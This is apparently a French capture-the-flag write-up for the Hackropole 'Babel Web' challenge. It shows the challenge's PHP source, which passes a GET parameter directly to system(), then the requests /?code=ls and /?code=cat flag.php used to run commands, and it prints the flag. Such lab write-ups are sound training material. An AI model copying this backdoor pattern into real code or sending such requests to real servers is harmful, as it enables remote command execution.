---
# Imported from Obsidian: CTF/Writeup CTF Hackropole/Web/🚩 Babel Web.md
title: Babel Web
category: Web
ctf: Hackropole (FCSC)
date: 2026-03-05
summary: 'Tâche 2 : Accéder au code source de la page'
tags:
- hackropole
- web
lang: fr
imported: true
---

### Catégorie : Web

Tâche 1- Accéder à la page web 

![Screenshot](./images/obsidian/babel-web/pasted-image-20260305125507.png)

Tâche 2 : Accéder au code source de la page 

![Screenshot](./images/obsidian/babel-web/pasted-image-20260305125544.png)

Le code source de la page nous révèle un commentaire très interressant, le
```
<!-- <a href="?source=1">source</a> -->
```

Ainsi nous allons essayer d'accéder à cette page : 

![Screenshot](./images/obsidian/babel-web/pasted-image-20260305125705.png)

```
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
```

```
/?code=ls
```

![Screenshot](./images/obsidian/babel-web/pasted-image-20260305125839.png)

```
/?code=cat flag.php
```

Flag : 
```
FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}
```
